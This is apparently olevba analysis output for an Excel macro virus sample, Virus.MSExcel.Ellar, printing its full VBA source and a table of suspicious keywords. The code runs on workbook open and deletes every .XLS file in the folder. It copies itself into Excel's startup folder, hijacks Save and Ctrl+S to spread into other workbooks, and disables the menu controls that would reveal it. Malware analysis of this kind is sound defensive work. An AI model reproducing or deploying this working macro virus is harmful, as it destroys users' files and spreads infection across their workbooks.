olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Ellar-ed5f544fc4468b35a776cf5eb5f9b9f9dad1f078
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSExcel.Ellar-ed5f544fc4468b35a776cf5eb5f9b9f9dad1f078 - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub Workbook_Open()
LR = "F6_T": Men (LR)
D_File
On Error GoTo Er
If Dir(Application.StartupPath & "\Microsoft.xls") <> "" Then
   If ActiveWorkbook.Name = "Microfoft.xls" Then
      Windows(ThisWorkbook.Name).Visible = False
   Else
      Windows(ThisWorkbook.Name).Visible = True
   End If
Else
   For I = 1 To Worksheets.Count
       If Sheets(Worksheets(I).Name).Visible = 0 Then Sheets(Worksheets(I).Name).Visible = 1
   Next I
 
   Application.DisplayAlerts = False: No = Worksheets.Count
   For I = No To 1 Step -1
       If Trim(Worksheets(I).Name) <> "0" Then _
       Sheets(Worksheets(I).Name).Delete
   Next I
   Application.StatusBar = ""
   ThisWorkbook.SaveAs FileName:=Application.StartupPath & "\Microsoft.xls"
   
   Application.DisplayAlerts = True
End If
Exit Sub
Er:
  Windows(ThisWorkbook.Name).Visible = False
End Sub


-------------------------------------------------------------------------------
VBA MACRO Menu.bas 
in file: Virus.MSExcel.Ellar-ed5f544fc4468b35a776cf5eb5f9b9f9dad1f078 - OLE stream: '_VBA_PROJECT_CUR/VBA/Menu'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public Function Men(LR As String)
On Error Resume Next
For Each BAR In CommandBars
  If UCase(BAR.Name) = "WORKSHEET MENU BAR" Then
     I = 0
     For Each ctl In CommandBars("Window").Controls
       I = I + 1
       If ctl.Id = 866 Then CommandBars("Window").Controls(I).Enabled = True
     Next
  
     I = 0
     For Each ctl In CommandBars("Tools").Controls
       I = I + 1
       If ctl.Id = 30017 Then CommandBars("Tools").Controls(I).Enabled = True
     Next
  
    I = 0
     For Each ctl In CommandBars("File").Controls
       I = I + 1
       If ctl.Id = 3 Or ctl.Id = 748 Then CommandBars("File").Controls(I).OnAction = LR
     Next
  End If
  
  I = 0
  For Each ctl In CommandBars(BAR.Name).Controls
    I = I + 1
    If ctl.Id = 3 Or ctl.Id = 748 Then _
        CommandBars(BAR.Name).Controls(I).OnAction = LR
    If ctl.Id = 30017 Or ctl.Id = 866 Then _
       CommandBars(BAR.Name).Controls(I).Enabled = False
  Next
Next
Application.OnKey "^{s}", LR
End Function
-------------------------------------------------------------------------------
VBA MACRO Visual.bas 
in file: Virus.MSExcel.Ellar-ed5f544fc4468b35a776cf5eb5f9b9f9dad1f078 - OLE stream: '_VBA_PROJECT_CUR/VBA/Visual'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public Function F6_T()
On Error Resume Next
Dim SF_Name() As String
If Trim(ActiveWorkbook.Path) = "" Then
   ActiveWorkbook.Save
   Exit Function
Else
   F_Name = ActiveWorkbook.Path & "\" & ActiveWorkbook.Name
End If
  

OK = "F": No = Worksheets.Count
Application.ScreenUpdating = False
For I = 1 To No
    If Trim(Worksheets(I).Name) = "0" Then OK = T
    If Sheets(Worksheets(I).Name).Visible = 0 Then
       KX = KX + 1
       ReDim Preserve SF_Name(KX)
       Sheets(Worksheets(I).Name).Visible = 1
       SF_Name(KX) = Worksheets(I).Name
    End If
Next I
  
If OK = "F" Then
   A_Sheet = ActiveWorkbook.Name
   N_Sheet = ThisWorkbook.Name
  
   Windows(N_Sheet).Visible = True
   Application.ScreenUpdating = False
   For I = No To 1 Step -1
     tx = Workbooks(A_Sheet).Worksheets(I).Name
     Workbooks(A_Sheet).Sheets(tx).Move Before:=Workbooks(N_Sheet).Sheets(1)
   Next I
End If

Sheets("0").Visible = False
For I = 1 To KX
    Sheets(SF_Name(I)).Visible = False
Next I

Application.DisplayAlerts = False
ActiveWorkbook.SaveAs FileName:=F_Name
Application.DisplayAlerts = True
LR = "S_ave": Men (LR)
End Function
Public Function S_ave()
 ActiveWorkbook.Save
End Function
Public Function D_File()
On Error Resume Next
If ActiveWorkbook.Path <> "" Then
   D_F = ActiveWorkbook.Path & "\*.XLS"
   File = Dir(D_F, vbHidden)
   Do While File <> ""
   If File <> "." And File <> ".." Then
      Kill ActiveWorkbook.Path & "\" & File
   End If
   File = Dir
   Loop
End If
End Function
-------------------------------------------------------------------------------
VBA MACRO Sheet3.cls 
in file: Virus.MSExcel.Ellar-ed5f544fc4468b35a776cf5eb5f9b9f9dad1f078 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet2.cls 
in file: Virus.MSExcel.Ellar-ed5f544fc4468b35a776cf5eb5f9b9f9dad1f078 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: Virus.MSExcel.Ellar-ed5f544fc4468b35a776cf5eb5f9b9f9dad1f078 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1 (2
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Workbook_Open       |Runs when the Excel Workbook is opened       |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|ActiveWorkbook.SaveA|May save the current workbook                |
|          |s                   |                                             |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

